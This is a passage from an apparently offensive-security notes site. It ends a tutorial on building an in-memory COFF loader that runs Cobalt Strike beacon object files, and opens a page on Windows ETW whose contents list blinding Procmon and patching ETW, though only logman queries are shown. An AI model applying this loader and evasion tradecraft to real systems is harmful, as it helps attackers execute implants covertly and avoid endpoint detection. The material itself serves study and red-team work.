symbol name is greater than 8 characters : the first.name[0] will be equal to 0 and the first.value will contains the offset of the symbol name in the Symbol Sting Table.\n\nWhen the name is greater than 8 characters, the full-symbol name can be retrieved with the following code:\n// pseudo code\nchar *name = symbolStringTable + coffSymbol.first.value\n\nThe value value is the symbol value. This entry can have different meanings depending on the symbol storage class.\nThe sectionNumber value is the section index where the symbol data is stored.\nThe type value is the type of the symbol ie the type of the value it represents. For example, it could be DT_CHAR, DT_INT, DT_FUNCTION. Usually, this field is not really used and is either DT_FUNCTION or 0.\nThe storageClass value represents how the data is actually stored in this symbol. The following table contains the main possible values and their specificities:\n\n\n\nName\nValue\nDescription\n\n\n\n\nIMAGE_SYM_CLASS_NULL\n0x0\nNo storage type\n\n\nIMAGE_SYM_CLASS_NULL_AUTO\n0x01\nauto type. It is usually used for auto-allocated values stored in the stack\n\n\nIMAGE_SYM_CLASS_EXTERNAL\n0x02\nThe symbol is defined in another COFF object. If the section number is 0, the symbol's value represent the symbol size, otherwise it represents the symbol offset within its section\n\n\nIMAGE_SYM_CLASS_STATIC\n0x03\nThe symbol defined a static value. If the symbol's value is not 0, it represents the symbol offset within its section\n\n\n\nThus, if the symbol storage class is either IMAGE_SYM_CLASS_STATIC or IMAGE_SYM_CLASS_EXTERNAL with a non 0 section index, the symbol address can be computed as follows:\n// pseudo code\nvoid *symbolAddress = sections[coffSymbol.sectionIndex].pointerToRawData + coffSymbol.value;\n\nFinally, the numberOfAuxSymbols represents the number of auxiliary symbols that are contained right after the symbol record. \n\nThese auxiliary symbols are usually linker specific and thus can be ignored for now as the COFFLoader does not link different object files to one another. They give additional information about the linked symbol. For example, in case of a symbol defining a function, the additional symbol can contain information about the total size of the function. \nThis additional information is not really needed for the COFFLoader.\nSymbol Table String\nThis table just contains the name of the symbols\n\nThis table is used to resolve symbols' name whose size is greater than 8 characters (see previous section about Symbol Table)\nConclusion\nSo now, all information is given to allow anyone to easily parse a Windows COFF file. It is possible to retrieve the COFF header, iterate through the different sections, retrieve their raw data. It is then possible to parse the relocation tables associated to each section and retrieve all the symbols needed.\nTime to start mapping all these things in memory.\nWrite sections in memory\nThe sections contain all the interesting data used by the program. Indeed, the compiled code is contained in the .text section and the variable in the .XXXdata sections.\nThe first thing to do is to parse all these sections and map them in memory. This can be done with the following code:\n// pseudo code\n// void *data : represent the first byte of the COFFFile\n// void **sectionAddressMemory : table that will store section's allocated memory address\n\n// Retrieve the header and fill the CoffHeader structure. In C a simple cast does the job.\nCoffHeader *coffHeader = (COFFHeader *)data\nfor(size_t i = 0; i numberOfSections; i++){\n\n    // Get the current section\n    CoffSection *section = (CoffSection *)(data + HEADER_SIZE + SECTION_SIZE * i);\n\n    // Allocate the memory\n    sectionAddressMemory[i] = VirtualAlloc(section->sizeOfRawData);\n\n    // Write section data in the allocated memory\n    CopyMemory(sectionAddressMemory[i], data + section->pointerToRawData, section->sizeOfRawData);\n}\n\nSo now, all sections are mapped in memory. The relocations can be performed directly in memory.\nPerform relocations\nOnce the sections are mapped in memory, each relocation entry must be parsed and performed in order to map the symbol address in the section code.\nThe idea is to replace the current section code :\n  000000000000001B: 48 8D 0D 00 00 00 00 lea         rcx,[??_C@_0M@KPLPPDAC@Hello?5World@]\n  0000000000000022: E8 00 00 00 00       call        __imp_printf\nBy \n  000000000000001B: 48 8D 0D XX XX XX XX lea         rcx,[??_C@_0M@KPLPPDAC@Hello?5World@]\n  0000000000000022: E8 YY YY YY YY       call        __imp_printf\nWhere XX XX XX XX points to the ??_C@_0M@KPLPPDAC@Hello?5World@ definition address and YY YY YY YY point to the printf definition address.\nThe relocation of external functions such as printf are quite special. Thus, symbols will be separated in two categories :\n\nStandard symbols : symbol whose relocation can be directly performed such as standard initialized variable or internal functions\nSpecial symbols : symbol that must be pre-processed before being rellocated such as uninitialized variable or external functions.\n\nSpecial symbol\nThe special symbols are symbols that could not be easily resolved through lookup in the different COFF file sections.\nFor example, an internal function funct1, that is defined directly in the C file used to generate the COFF file will have all its body contained in a section (usually the .text section). Its symbol can thus be resolved through a simple lookup at the right COFF section.\nHowever, what happens for functions defined in an external library such as the printf function ?\nExternal functions\nExternal functions are all functions that are not directly defined in the C source file used to generate the COFF file. These function symbols definition do not point to a valid section in the COFF file:\n\nThis figure shows that the sectionNumber for this symbol is 0. Thus, it cannot be resolved as it will not be possible to find its address in one of the COFF section.\nThis is where the Global Offset Table saves the day. This table can be seen as a made-up section that is generated at run time. This section is used to reference address to functions defined in shared libraries or DLL and serves as a lookup table.\nFor example, the printf function is defined in the MSVCRT Windows library. During the runtime, the OS will search the printf function address in the MSVCRT library (* with GetProcAddress for example) and fill the GOT with this address. When the program tries to access the printf function, it will point on the GOT and gets the address previously fetched by the system.\nThe idea is to simulate this process. First a new section will be allocated in memory:\n//pseudo code\nvoid *got = VirtualAlloc(1024);\n\nThe printf function is resolved using GetModuleHandle and GetProcAddress to retrieve the function address in the library. Then the address is copied in the GOT section previously allocated and resolve the __imp_printf to the GOT address.\n// pseudo code\nvoid *printfAddress = GetProcAddress(GetModuleHandle(\"MSVCRT\"), \"printf\");\nvoid *nextFreeGotSlot = got + gotSize * 0x08;\nCopyMemory(nextFreeGotSlot, &printfAddress, sizeof(uint64_t));\ngotSize += 1;\nvoid *absoluteSymbolAddress = nextFreeGotSlot;\n\nFrom now, the absoluteSymbolAddress will be used as the absolute address to the __imp_printf symbol definition.\nThis is equivalent to modify the CoffSymbol structure by changing the sectionNumber from 0 to .got and filling the .got section with resolved function addresses.\nUninitialized variables\nWhen a global un-initialized variable is defined in the source code, its symbol is created in the COFF file. However, as it is uninitialized, its value is not mapped in any sections.\nUsually, this variable will end in the .bss section that is created at run time.\nThe idea is to create a new section that will emulate the .bss section.\n//pseudo code\nvoid *bss = VirtualAlloc(1024);\n\nThe un-initialized symbols will then be resolved on an addresse contained in the newly created .bss section as the external functions are in the .got section.\nHowever, for the functions in the .got , the symbol size is always the same : the size of the function address. For symbols resolved in the .bss , the size is the variable size.\nFor example, a uint32_t symbol will ne take the same space in the .bss as a uint64_t symbol. Likewise, a char[10] will take twice the space used by a char[5]. Hopefully, the size of the symbol is given in the symbolic value attribute in its CoffSymbol structure.\n\nIn this example, the plop symbol represents an initialized variable whose size is 0x0B bytes. This information can be used to allocate enough space for each symbol.\n// pseudo code\n// void *bss : the allocated address for the .bss section\n// size_t bssOffset : the size already used in the .bss section\n\nsize_t symbolSize = coffSymbol->value;\nvoid *absoluteSymbolAddress = bss + bssOffset;\n\n// The next symbol will be resolved after the current one in the .bss\nbssOffset += symbolSize;\n\nThen, each time the un-initialized variable symbol is referenced, it will be resolved to the absoluteSymbolAddress address.\nThis is equivalent to modify the CoffSymbol structure by changing the sectionNumber from 0 to .bss and modifying the value field with the .bss offset used.\nDetect and process special symbols\nThe whole game is to be able to make the difference between a standard symbol that can be directly relocated and a non-standard symbol that must be pre-processed before being relocated.\nThe non-standard symbols are, actually, the symbols that cannot be resolved directly in the COFF file. This feed through having an undefined section index (sectionNumber value set to 0 in the CoffSymbol structure) and having the IMAGE_SYM_CLASS_EXTERNAL storage class.\n// pseudo code\nif(coffSymbol->storageClass == IMAGE_SYM_CLASS_EXTERNAL && coffSymbol->sectionIndex == 0){\n    // process non standard symbol\n}\n\nOnce the non-standard symbol is detected, the difference between an external function and an un-intialized variable must be done. \nThe external function symbols' name is quite recognizable as it always starts with __imp_. If the symbol name starts with this pattern, it could be assumed it represents a function.\n//pseudo code\nchar* symbolName = resolveSymbolName(coffSymbol);\nif(strncmp(symbolName, \"__imp_\", 6) == 0){\n    // process the function\n}\nelse{\n    // process the uninitialized variable\n}\n\nThe un-initialized variable symbol processing is quite straight forward, but for functions it requires more work. Indeed, in order to resolve the function in its shared library, the library name and the function name must be known.\nHowever, in a common COFF file the function symbol only contains the function name (ie __imp_printf). This can be solved through the Dynamic Function Resolution convention. The DFR set a specific syntax for external function definition and name.\nThe following code shows the Hello world program using DFR:\nDECLSPEC_IMPORT int __cdecl MSVCRT$printf(const char* test, ...);\n\nint main(void){\n    MSVCRT$printf(\"Hello World !\\n\");\n}\n\nIn this convention, the library name is added to the function name. After compilation, the printf symbol will look like __imp_MSVCRT$printf.\nThis syntax solve all the problems as the shared library named is included in the symbol name. The function can then be resolved like this:\n// pseudo code\n// char* symbolName : the symbol name\n\n// Remove the __imp_\nsymbolName += 6;\nchar *splittedName = symbolName.split('$');\nchar *libraryName = splittedName[0];\nchar *functionName = splittedName[1];\nvoid *functionAddress = GetProcAddress(GetModuleHandle(libraryName), functionName);\n\nThus, when writing BOF the DFR convention must be followed. To avoid heavy syntax, a simple typedef can be performed:\nDECLSPEC_IMPORT int __cdecl MSVCRT$printf(const char* test, ...);\ntypedef printf MSVCRT$printf\n\nint main(void){\n    printf(\"Hello World !\\n\");\n}\n\nConclusion\nFrom now, all symbols represented in the COFF file can be resolved to an address in memory. The functions will be resolved to the newly created .got section and the un-initialized variable will be resolved to the new created .bss section. They can then be processed as standard symbols as long as their definition address used during the relocation is the one pointing to the .got or the .bss.\nFinally, the functions address can be resolved through the GetModuleHandle and GetProcAddress thanks to the Dynamic Function Resolution convention.\nLet's remap the symbol in the section !\nStandard symbol relocation\nThese symbols can be relocated quite easily. In order to perform the relocation three information are needed:\n\nThe relocation type : to know in wich format (relative or absolute) the symbol address must be given\nThe symbol reference address : to know where in the section the symbol address must be written\nThe symbol definition address : to know where the computed symbol reference address must point\n\n\nRelocation type\nThe relocation type can be easily retrieved in the CoffReloc structure.\nSymbol reference address\nThe symbol reference address represents the first byte in the section that must be rewritten with the symbol definition address.\nIt can be computed from the information contained in the current CoffSection and CoffReloc structure with the following formula:\n// pseudo code\n// int i : index of the currently processed section\nvoid *symbolRefAddress = sectionAddressMemory[i] + coffReloc.virtualAddress\n\nThis address is the copy destination.\nSymbol definition address\nThat is where the fun begins. Indeed, depending on the relocation type and the symbol storage type this address is computed differently. \nThe relocation type gives indication of the address positioning type expected by the section ie absolute or relative address. The symbol storage type gives indication about how the symbol offset can be found.\nIn this part, the main relocation type will be studies. Other relocation type can be found in COFF files but they will mainly be used for debugging or could be easily transcribed from the indication written here.\nIMAGE_REL_AMD64_ADDR64\n\nPositioning : Absolute\nAddress size : 64bit\nComplexity   : Easy\n\nStart with an easy one.\nThis relocation type indicates an absolute positioning. The symbol address computed is expected to directly point on the symbol address if the start point is the address 0x0.\nThe ADDR64 part of the relocation type shows that a 64bit address is expected by the section.\nThe symbol definition address can simply be computed with the following formula:\n//pseudo code\n// void *symbolOffset : the symbol offset in its definition section\n// CoffSymbol *coffSymbol : the current symbol\n\nuint64_t symbolDefAddress = (uint64_t)symbolOffset + (uint64_t)sectionAddressMemory[coffSymbol->sectionIndex];\n\nThe symbolOffset computation method will be seen later.\nThe value can then be copied at the address pointed by the symbol reference address computed earlier.\nCopyMemory(symbolRefAddress, &symbolDefAddress, sizeof(uint64_t));\n\nIMAGE_REL_AMD64_ADDR32NB\n\nPositioning : Relative\nAddress size : 32bit\nComplexity   : Medium\n\nA little bit trickier.\nThis relocation type indicates a relative positioning. The symbol address computed is expected to directly point on the symbol address if the start point is the previously computed symbol reference address.\nLooking at the figure explaining the difference between absolute and relative address, this symbol definition can be computed with the following formula:\n//pseudo code\n// void *symbolOffset : the symbol offset in its definition section\n// CoffSymbol *coffSymbol : the current symbol\n\nuint64_t absoluteSymbolAddress = (uint64_t)symbolOffset + (uint64_t)sectionsAddress[coffSymbol->sectionNumber]\nuint32_t relativeSymbolDefAddress = (uint32_t)(absoluteSymbolAddress - (symbolRefAddress + 4))\n\nThis value can then be copied at the address pointed by the symbol reference address computed earlier.\nCopyMemory(symbolRefAddress, &relativeSymbolDefAddress, sizeof(uint64_t));\n\nIMAGE_REL_AMD64_ADDR_REL32_X\n\nPositioning : Relative\nAddress size : 32bit\nComplexity   : Medium\n\nLike the previous one, buuuuuuut not really.\nThere are 6 relocation type starting with IMAGE_REL_AMD64_ADDR_REL32 :\n\nIMAGE_REL_AMD64_ADDR_REL32\nIMAGE_REL_AMD64_ADDR_REL32_1\nIMAGE_REL_AMD64_ADDR_REL32_2\nIMAGE_REL_AMD64_ADDR_REL32_3\nIMAGE_REL_AMD64_ADDR_REL32_4\nIMAGE_REL_AMD64_ADDR_REL32_5\n\nAll these relocation types can be handled with the same formula. The _X at the end of the name represents a little offset of X byte that must be subtracted to the relative symbol definition address computed.\nAll these relocation can be handled with the same generic formula:\n//pseudo code\n// void *symbolOffset : the symbol offset in its definition section\n// CoffSymbol *coffSymbol : the current symbol\n\nuint64_t absoluteSymbolAddress = (uint64_t)symbolOffset + (uint64_t)sectionsAddress[coffSymbol->sectionNumber]\nuint32_t relativeSymbolDefAddress = (uint32_t)(absoluteSymbolAddress - (coffReloc->type - 4) - (symbolRefAddress + 4))\n\nThis value can then be copied at the address pointed by the symbol reference address computed earlier.\nCopyMemory(symbolRefAddress, &relativeSymbolDefAddress, sizeof(uint64_t));\n\nCompute symbol offset\nAs shown in the previous part, the symbol offset is a value needed to compute either absolute or relative symbol definition address. \nDepending on the symbol's storage class, this offset can be computed in different ways.\nCompute standard symbol's offset\nThe standard way to retrieve the symbol offset is by looking at the last byte of the value pointed by the address stored in the relocation structure.\n// pseudo code\n// void **sectionAddressMemory : table that stores section allocated memory address\nuint32_t symbolOffset = *(sectionAddressMemory[i] + coffReloc->virtualAddress)\n\nCompute STATIC and EXTERNAL symbol's offset\nThe offset computation method is quite different for the symbols whose storage class is either IMAGE_SYM_CLASS_STATIC or IMAGE_SYM_CLASS_EXTERNAL.\nIndeed, for the IMAGE_SYM_CLASS_STATIC symbols, the offset is contained in the CoffSymbol structure's value field if different than 0. Otherwise, the computation method fallback to the default one explained in the previous part.\nFor the IMAGE_SYM_CLASS_EXTERNAL symbols, the offset is also contained in the CoffSymbol structure's value field if the symbol sectionNumber is not 0. Otherwise, the computation method fallback to the default one explained in the previous part.\n// pseudo code\n\nuint32_t symbolOffset;\nif ((coffSymbol->storageClass == IMAGE_SYM_CLASS_STATIC && coffSymbol->value != 0) || (coffSymbol->storageClass == IMAGE_SYM_CLASS_EXTERNAL && coffSymbol->sectionNumber != 0x0)) {\n    // With static class symbol, the offset is given through the symbol->value (if not 0)\n    // and not in the segment symbol address last bytee\n    symbolOffset = coffSymbol->value;\n}\nelse {\n    // For standard symbol, the offset is given as the last byte of the\n    // value pointed by the symbol reference address in the section.\n    CopyMemory(&segmentOffset, symbolReferenceAddress, sizeof(uint32_t));\n}\n\nYey ! It is now possible to compute all addresses needed to perform the symbol relocation.\nPut things altogether\nIn order to perform all relocation, the different section must be parsed, their relocation table retrieved and applied. The following code can be used as a template:\n// pseudo code\n// void *data : the address of the first COFF byte\n\nCoffHeader *coffHeader = (coffHeader *)data\nfor(size_t i = 0; i numberOfSections; i++){\n    // parse all the sections\n    CoffSection *coffSection = data + HEADER_SIZE + SECTION_SIZE * i;\n\n    // parse all the relocations for the given section\n    for(size_t j = 0; j numberOfRelocations; j++){\n        // get the current relocation to process\n        CoffReloc *coffReloc = data + coffSection->pointerToRelocations + RELOC_SIZE * j;\n\n        // get the symbol related to the relocation\n        CoffSymbol *coffSymbol = data + coffHeader->pointerToSymbolTable + SYMBOL_SIZE * coffReloc->symbolTableIndex\n        void *symbolDefAddress;\n        if(isNonStandardSymbol(coffSymbol)){\n\n            if(isExternalFunctionSymbol(coffSymbol)){\n                // resolve the function\n                // add the function address in the .got\n                // return the got address pointing to the resolved function\n                symbolDefAddress = resolveAndAddToGot(coffSymbol);\n            }\n            else{\n                // create a new entry in the .bss\n                // return the address pointing to the new entry in the .bss\n                symbolDefAddress = addBssEntry(coffSymbol);\n            }\n        }\n        else{\n            // Compute the symbol absolute address\n            symbolDefAddress = getSymbolOffset(coffSymbol) + sectionsAddress[coffSymbol->sectionNumber]\n        }\n\n        // Compute the address expected by the section \n        // Write it in the section\n        processRelocation(coffSymbol, symbolDefAddress, coffReloc->type);\n    }\n}\n\nSo now all the sections can point to the right address and reach their symbols. The program can be run without trying to reach an undefined address such as 0x00000000.\nRun the code\nNow all symbols are resolved, it is possible to run the code linked in memory. This can be done in three simple steps:\n\nRetrieve the symbol address related to the function to run (the function main(int argc, char **argv) for example)\nCast the address to a function prototype\nRun the function\n\nThis can be done with the following code:\n//pseudo code\n// void **sectionAddressMemory : table that stores section allocated memory address\n\nfor(size_t i = 0; i numberOfSymbols; i++){\n    CoffSymbol *coffSymbol = (CoffSymbol *)(data + coffHeader->pointerToSymbolTable + SYMBOL_SIZE * i);\n    char *symbolName = resoleSymbolName(coffSymbol);\n\n    // find the symbol related to the main function\n    if(strcmp(symbolName, \"main\") == 0){\n\n        // define the function prototype\n        int(* function)(int argc, char **argv);\n\n        // cast the symbol address into a function\n        function = int(*)(int, argv **)(sectionAddressMemory[coffSymbol->sectionIndex] + coffSymbol->value)\n\n        // run the function with its arguments\n        function(argc, argv);\n    }\n}\n\nIf all relocations have been successfully performed, the function should run smoothly ! \nYey ! Here is your CoffLoader ! \nUpgrade\nCompatibility with CobaltStrike BOF\nThe current COFFLoader will be unable to run standard CobaltStrike BOF. Indeed, the CobaltStrike BOF use specific API that allows it to communicate with the beacon.\nThis communication is mandatory as CobaltStrike beacons need to be able to retrieve the COFF result to send it back to the operator.\nCobaltStrike BOF specificities\nThe CobaltStrike documentation shows several API that can be used in the BOF to communicate with the beacon.\nThe following functions can be used in the BOF code:\n\n\n\nCategory\nFunction Name\nDescription\n\n\n\n\nArgument Parsing\nBeaconDataParse\nInitialize the BOF argument parser\n\n\nArgument Parsing\nBeaconDataInt\nExtract int from arguments\n\n\nArgument Parsing\nBeaconDataShort\nExtract short from arguments\n\n\nArgument Parsing\nBeaconDataLength\nGet arguments string length\n\n\nArgument Parsing\nBeaconDataExtract\nExtract string from arguments\n\n\nResponse Formatting\nBeaconFormatAlloc\nAllocate memory to format large output\n\n\nResponse Formatting\nBeaconFormatReset\nResets format object to its default state\n\n\nResponse Formatting\nBeaconFormatFree\nFree the format object\n\n\nResponse Formatting\nBeaconFormatAppend\nAppend data to the format object\n\n\nResponse Formatting\nBeaconFormatPrintf\nAppend formatted data to the the object\n\n\nResponse Formatting\nBeaconFormatToString\nReturn the object as a string\n\n\nResponse Formatting\nBeaconFormatInt\nAppend a 4bytes big endian integer to the object\n\n\nResponse Formatting\nBeaconPrintf\nFormat and send the output to the beacon\n\n\nResponse Formatting\nBeaconOutput\nSend output to the beacon\n\n\nAdvanced Operation\nBeaconUseToken\nApply the specified token as Beacon's current thread token\n\n\nAdvanced Operation\nBeaconRevertToken\nDrop the current thread token\n\n\nAdvanced Operation\nBeaconIsAdmin\nReturn true if the beacon is in high integrity\n\n\nAdvanced Operation\nBeaconGetSpawnTo\nPopulate the specified buffer with the x86 or x64 spawnto value configured for this Beacon session\n\n\nAdvanced Operation\nBeaconSpawnTemporaryProcess\nSpawn en temporary process\n\n\nAdvanced Operation\nBeaconInjectProcess\nInject payload in the specified process\n\n\nAdvanced Operation\nBeaconInjectTemporaryProcess\nThis function will inject the specified payload into a temporary process that the BOF opted to launch through\n\n\nAdvanced Operation\nBeaconCleanupProcess\nCleanup handles\n\n\nAdvanced Operation\ntoWideChar\nConvert the src string to a UTF16-LE wide-character string, using the target's default encoding\n\n\n\nThese API are not supported by the CoffLoader out of the box. They must be implemented in the CoffLoader code.\nCobaltStrike furnishes a header file that can be used to compile BOF. This header file can be used as a base to rebuild the API that will be integrated in the COFFLoader.\nTrustedSec starts to implement several of these API in C. The file can be found here.\nOnce these API are implemented, they must be accessible to the COFF file launched by the COFFLoader. Unlike functions available in shared libraries, it will not be possible to use GetProcAddress to resolve these functions.\nAdd support for beacon internal functions\nIn order to be able to resolve the CobaltStrike API functions symbols used in the COFFfile, the easiest way is to collect all functions address in an array and use these addresses while resolving the symbols.\n// pseudo code\n\nunsigned char **internalFunctions = {\n    {(unsigned char*)\"BeaconDataParse\", (unsigned char*)BeaconDataParse},\n    {(unsigned char*)\"BeaconDataInt\", (unsigned char*)BeaconDataInt},\n    {(unsigned char*)\"BeaconDataShort\", (unsigned char*)BeaconDataShort},\n};\n\nThen, in the function used to resolve functions address it is possible to check whether the function to resolve is one of the internal functions or an function stored in shared librairies.\nThe internal function can be differentiated from shared libraries as their DFR name will not show any external library :\nDECLSPEC_IMPORT void    BeaconDataParse(datap * parser, char * buffer, int size);\n\nThus, the generated symbol will not contain any shared library name to look at.\nIn this case, the internalFunctions array can simply be looped over while the function name is not found. Once the right entry is found, the address related to the function can be added to the .got section.\n// pseudo code\n// char *functionSymbolName : function symbol name in DFR resolution\n\nvoid *functionAddress = NULL;\nchar **symbolSplitted = functionSymbolName.split('$');\nif(strlen(symbolSplitted[1]) == 0){\n    // The symbol represents an internal function\n\n    char *functionName = symbolSplitted[0];\n\n    // loop through defined internal functions\n    for(size_t i = 0; i \nThe COFF will then be able to resolve internal functions symbols and communicate with the COFFLoader process for, as an example, returning execution results through the BeaconPrintf function.\nThis method can be applied to any function defined in the COFFLoader code.\nFormat parameters for CobalStrike BOF\nThe parameters given to ColbaltStrike BOF must be formatted in a given way. Indeed, the BeaconAPI used by CobaltStrike BOF expects the parameters to be formatted in a given way.\n\nAll parameters must be given as a single string\nString parameters are expected to be a length prefixed binary blob\nNumber parameters are not length prefixed (as their type define their length)\nThe whole parameter string is expected to be a length prefixed binary blob\nLength prefixes are a 4-byte values\n\nThus, if your BOF expects two parameters (one string and one integer), they must be sent as follows :\n// each length is in bytes : length(\"hello world\") = strlen(\"hello world\") * sizeof(char)\n${totalLength}${stringArgumentLength}${stringArgument}${intArgument}\n\nThe following C code can be used to format a list of parameters as a CobaltStrike parameter string:\ntypedef struct _Arg {\n    void* value;         // the useful argument value\n    size_t size;        // the size in byte of the value\n    BOOL includeSize;   // is the value must be given as length-prefixed\n} Arg;\n\nvoid PackData(Arg* args, size_t numberOfArgs, char** output, size_t* size) {\n    uint32_t fullSize = 0;\n    for (size_t i = 0; i \nDynamic .got and .bss\nThe VirtualAlloc call used to allocate the .got and .bss section uses a static predefined size of 1024 bytes. If there are more than 1024 bytes of function pointers or initialized data that must be defined during the symbol resolution, the CoffLoader will crash during the COFF linking time. Indeed, it will try to write symbol data in un-allocated memory in the .bss or the .got.\nTo avoid using fixed size .got and .bss sections, it is possible to pre-calculate their sizes by looking at all the symbols before allocating the memory.\nThis method is quite effective but it will ask the CoffLoader to enumerate and resolve twice the symbols : a first one to calculate the section size, the second one to resolve and relocate the symbols.\nTo avoid this unnecessary double lookup, it is possible to save the resolved symbols during the first processing and then reuse the values for the relocation.\nThe following structures can be used to save the pre-resolved symbols:\ntypedef struct _BssEntry {\n    void* symbol;            // address of the current processed symbol\n    uint64_t bssOffset;        // offset of the resolved symbol in the .bss\n} BssEntry;\n\ntypedef struct _GotEntry {\n    void* symbol;            // address of the current processed symbol\n    void* function;            // address of the resolved function (GetProcAddress or internal function)\n    uint64_t gotOffset;     // offset of the resolved symbol in the got\n} GotEntry;\n\nThese structures are filled up before the .got and .bss section allocation:\n// pseudo code\n\nsize_t bssOffset = 0;\nsize_t gotSize = 0;\n// loop over each symbols\nfor (uint32_t i = 0; i numberOfSymbols; i++) {\n\n    // get the current symbol\n    CoffSymbol* coffSymbol = (CoffSymbol*)((uint64_t)symbols + (uint64_t)i * SYMBOL_SIZE);\n\n    if(isUninitializedVariable(coffSymbol)){\n        // save the symbol information\n        bssSymbols.append({\n            .symbol = coffSymbol,\n            .bssOffset = bssOffset\n        });\n\n        // extend the futur .bss section size\n        bssOffset += coffSymbol->value;\n    }\n    else if(isExternalFunction(coffSymbol)){\n\n        // get the external function address through GetProcAddress \n        // or in the internalFunctions array\n        void *functionAddress = resolveExternalFunction(coffSymbol);\n\n        // save the symbol information\n        gotSymbols.append({\n            .symbol = symbol,\n            .function = functionAddress,\n            .gotOffset = gotOffset\n        });\n\n        // extend the futur .got section size\n        gotOffset += 0x08;\n    }\n}\n\n// allocate the sections with the right size\nvoid *got = VirtualAlloc(gotSize);\nvoid *bss = VirtualAlloc(bssSize);\n\nThen, when relocation must be performed, these structures can be looked up to retrieve the pre-assigned offset in the .bss or .got and use these values as the absolute symbol definition address without re-resolving the symbol.\n// pseudo code\n// changes of the code used to perfom the relocation\n[...]\n\nif(isNonStandardSymbol(coffSymbol)){\n\n    if(isExternalFunctionSymbol(coffSymbol)){\n\n        // loop through the pre-resolved symbols\n        for(size_t i = 0; i \nSo now, your CoffLoader is able to process COFF files with undefined number of external functions and initialized variables.\nAnd as usual, Yey !\nConclusion\nThat was a long journey. After writing all of this, it looks like nothing is really complicated and I'm beginning to ask myself why it needs any explanation.\nThe design of a CoffLoader does not contain any complex concept. Everything is simple and quite obvious once the COFF specification is well understood...\nSo now, you should, too, think that the subject is simple and the loader can be easily implemented. I hope it is the case.\nAt the end of this article, you should understand how PE specification work and how to easily programmatically navigate through all this information. The PE format has not been seen in depth and several interesting parts are missing from this article (such as the PEB and all the secrets it contains) but it was not really the goal of the article.\nHowever, you should master the COFF specification for Windows Object. You should be able to easily find all the information you need in these files as well as being able to map them in memory. Likewise, the principle of relocation should not have any secret for you anymore. When someone will ask you why the hell my PE is performing relocation or why my linker tells me it cannot find the XXXX symbol you should be able to explain it to him, in more details he wanted, why his code sucks.\nAll of these theoretical knowledge should have helped you to develop the CoffLoader in its most advanced shape in order to run CobaltStrike BOF without needing to pay for the CobaltStrike license. Likewise, if you use CobaltStrike and do not need to implement any CoffLoader, this article should have been quite an interesting lecture as now you know exactly how all of it works and even gave you some basis to start writing your own BOF files.\nIn a personal point of view, I found the journey interesting and it helped me to deeply understand how Windows PE works and how the Object Files can be used to generate Windows binaries. I hope you liked this article and do not think it was a complete waste of time.\nRessources\n\nhttps://www.trustedsec.com/blog/coffloader-building-your-own-in-memory-loader-or-how-to-run-bofs/\nhttps://blog.katastros.com/a?ID=00100-b060e132-0540-4c53-8527-bf45b2964215\n\nExternal contribution\n\nch4rc0al1080: Fix typo in relocation table\n\n"},"Malware/ETW.html":{"url":"Malware/ETW.html","title":"ETW","keywords":"","body":"ETW\nTable of content\n\n\nOverview\nLogman\nProviders\nList providers\nInspect Providers\n\n\nTracing sessions\nList tracing sessions\nInspect tracing sessions\nUse tracing sessions\n\n\n\n\nSilkETW\nProcmon\nBlinding Procmon\nAutomating the process\nDetect Procmon tracing session\nKill Procmon tracing session\nCreate a new tracing session\nMake it persistent\nLimits\n\n\n\n\nPatching ETW\nWriting event to a provider\nFinding the API\nPatch the DLL\nLimits\n\n\n\n\n\n\nOverview\nThe Event Tracing for Windows or ETW is the mechanism used by Windows to log system events. ETW are designed through a provider/consumer concept. \nThe different process write their events in the providers and the consumers can access to these events through the providers.\n\nSeveral antivirus or EDR solutions such as Microsoft ATP heavily use these events to monitor the system.\nThe ETW events can be raised by the kernel but also by some userland functions. For example, when performing a simple HTTP request to use the WinHTTP API, an event is raised by the WinHttpSendRequest function on userland, but another event is also raised by the kernel when the connection is bound at the OS level.\nWhile removing userland events can be quite easy, tackling down kernel events can be more challenging.\nLogman\nWindows provides a built-in tool to access to the ETW tracing sessions: logman. This tool can be used to create, inspect and modify tracing sessions, inspect the different providers and other interesting things.\nProviders\nThe providers are the first stage of the ETW workflow. They are used to collect and categorize events generated by the different processes.\nList providers\nThe different providers can be listed using the following lgoman command:\nlogman query providers\n\n\n# Provider                                 GUID\n# -------------------------------------------------------------------------------\n# _802dot1X                                {1B243C08-ABC2-C043-37FD-A730D9E8E45C}\n# ACPI Driver Trace Provider               {DAB01D4D-2D48-477D-B1C3-DAAD0CE6F06B}\n# Active Directory Domain Services: SAM    {8E598056-8993-11D2-819E-0000F875A064}\n# Active Directory: Kerberos Client        {BBA3ADD2-C229-4CDB-AE2B-57EB6966B0C4}\n# Active Directory: NetLogon               {F33959B4-DBEC-11D2-895B-00C04F79AB69}\n# ADODB.1                                  {04C8A86F-3369-12F8-4769-24E484A9E725}\n# ADOMD.1                                  {7EA56435-3F2F-3F63-A829-F0B35B5CAD41}\n# Application Popup                        {47BFA2B7-BD54-4FAC-B70B-29021084CA8F}\n# Application-Addon-Event-Provider         {A83FA99F-C356-4DED-9FD6-5A5EB8546D68}\n# ATA Port Driver Tracing Provider         {D08BD885-501E-489A-BAC6-B7D24BFE6BBF}\n# AuthFw NetShell Plugin                   {935F4AE6-845D-41C6-97FA-380DAD429B72}\n# ...\n\nAs you can see, there are a lot of providers. Each provider is \"specialized\" in some types of events (such as the Microsoft-Windows-WinHTTP) but some other can compile several types of events such as the Windows Kernel Trace that compile event raised by kernel functions such as VirtualAlloc or CreateProcess.\nInspect Providers\nIf you want to retrieve a specific type of event, it could be quite challenging as the providers dumped by logman do not show the event they are channeling.\nHowever, logman can be used to inspect the different providers and extract the events they provide.\nlogman query providers \"Microsoft-Windows-WinHTTP\"\nProvider                                 GUID\n-------------------------------------------------------------------------------\nMicrosoft-Windows-WinHttp                {7D44233D-3055-4B9C-BA64-0D47CA40A232}\n\n# Value               Keyword              Description\n# -------------------------------------------------------------------------------\n# 0x0000000000000001  Keyword.API          API\n# 0x0000000000000020  WINHTTP_KEYWORD_AUTOPROXY Flagged on all WinHTTP events dealing with AUTOPROXY\n# 0x0000000100000000  Keyword.SEND         SEND\n# 0x0000000200000000  Keyword.RECEIVE      RECEIVE\n# 0x0000000400000000  Keyword.L3_CONNECT   L3_CONNECT\n# 0x0000001000000000  Keyword.CLOSE        CLOSE\n# 0x0000002000000000  Keyword.SECURITY     SECURITY\n# 0x0000004000000000  Keyword.CONFIGURATION CONFIGURATION\n# 0x0000008000000000  Keyword.GLOBAL       GLOBAL\n# 0x0000010000000000  Keyword.DROPPED      DROPPED\n# 0x0000020000000000  Keyword.PII_PRESENT  PII_PRESENT\n# 0x0000040000000000  Keyword.PACKET       PACKET\n# 